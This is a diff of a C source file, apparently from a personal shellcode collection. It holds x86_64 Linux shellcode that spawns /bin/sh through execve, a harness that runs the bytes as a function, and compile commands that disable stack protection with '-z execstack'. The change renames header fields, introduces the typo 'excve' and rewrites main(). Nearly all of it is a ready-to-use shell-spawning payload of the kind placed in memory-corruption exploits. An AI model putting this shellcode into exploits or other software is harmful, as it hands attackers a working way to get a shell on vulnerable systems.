@@ -2,10 +2,10 @@
 *********
 $ Infos $
 *********
-Created by: vida
+Author: vida
 Github: https://github.com/vida00/
-Command: execve("/bin/sh", NULL, NULL);
-For: linux x86_64
+Command: excve("/bin/sh", NULL, NULL);
+Arch: linux x86_64
 
 *****************
 $ Assembly Code $
@@ -39,13 +39,11 @@ $ objdump result $
 *****************
 $ Compile & Run $
 *****************
-C: gcc shellcode.c -o shellcode -z execstack
-Assembly: nasm shellcode.asm -f elf64 && ld shellcode.o -o shellcode
+Assembly: nasm shellcode.asm -f elf64 && ld shellcode.o -o shellcode && ./shellcode
+C: gcc shellcode.c -o shellcode -z execstack && ./shellcode
 */
 unsigned char shellcode[] = \
 "\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
-int main()
-{
-    int (*ret)() = (int(*)())shellcode;
-    ret();
+void main(){
+        (*(void(*)()) shellcode)();
 }
